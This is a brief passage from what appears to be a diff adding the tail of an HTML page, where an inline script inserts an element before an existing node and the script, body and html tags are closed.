+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</body>
+</html>
